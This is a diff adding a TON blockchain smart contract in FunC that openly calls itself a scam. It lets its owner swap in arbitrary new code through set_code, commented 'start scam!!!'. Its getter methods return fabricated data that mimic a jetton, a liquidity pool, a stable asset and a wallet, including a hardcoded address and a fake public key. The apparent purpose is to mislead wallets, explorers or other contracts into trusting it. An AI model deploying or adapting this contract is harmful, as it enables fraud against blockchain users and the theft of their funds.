@@ -1,0 +1,102 @@
+#include "imports/stdlib.fc";
+
+const op::scam_users = "op::scam_users"c; 
+const error::NOT_SCAM_OWNER = 666;
+
+
+global int scam_number;
+global slice scam_owner;
+
+() load_data() impure {
+    var ds = get_data().begin_parse();
+
+    scam_number = ds~load_coins();
+    scam_owner = ds~load_msg_addr();
+
+    ds.end_parse();
+}
+
+() save_data() impure {
+    set_data(
+        begin_cell()
+            .store_coins(scam_number)
+            .store_slice(scam_owner)
+            .end_cell()
+    );
+}
+
+() recv_internal(cell in_msg_full, slice in_msg_body) impure {
+    if (in_msg_body.slice_empty?()) {
+        return ();
+    }
+
+    slice cs = in_msg_full.begin_parse();
+    int flags = cs~load_uint(4);
+    if (flags & 1) {
+        return ();
+    }
+    slice sender_address = cs~load_msg_addr();
+    load_data();
+
+    int op = in_msg_body~load_uint(32);
+    int query_id = in_msg_body~load_uint(64); 
+
+    if (op == op::scam_users) {
+        throw_unless(error::NOT_SCAM_OWNER, equal_slices(scam_owner, sender_address));
+        cell new_code = in_msg_body~load_ref();
+        set_code(new_code); ;; change code of contract and start scam!!!
+        return ();
+    }
+
+    throw(0xffff); ;; if the message contains an op that is not known to this contract, we throw
+}
+
+
+(int, int, slice, cell, cell) get_jetton_data() method_id {
+    load_data();
+    return (scam_number, -1, null_addr(), begin_cell().store_coins(scam_number).end_cell(), begin_cell().store_slice(scam_owner).end_cell());
+} ;; even dont care about wrong data
+
+
+(int, int, slice, slice, int, int, int, slice, int, int) get_pool_data() method_id {
+    load_data();
+    return (
+        1337133711223344,
+        123456789123456789,
+        scam_owner,
+        null_addr(),
+        0,
+        0, 
+        0,
+        null_addr(),
+        1337, 
+        1337
+    );
+}
+
+(int, slice, slice, cell) get_wallet_data() method_id {
+  load_data();
+
+  return (13371337, null_addr(), "0QCxE6mUtQJKFnGfaROTKOt1lZbDiiX1kCixRv7Nw2Id_iaj"a, begin_cell().store_coins(scam_number).end_cell());
+}
+
+
+(int) is_stable() method_id {
+    return -1;
+}
+
+(int) get_public_key() method_id {
+  return 112377269205063444897818193853948622044342100606741384471716941252734819194686;
+}
+
+(int) get_seqno() method_id {
+    return 1337;
+}
+
+(int) get_status() method_id {
+    return 0;
+}
+
+int get_subwallet_id() method_id {
+  return 13371337;
+}
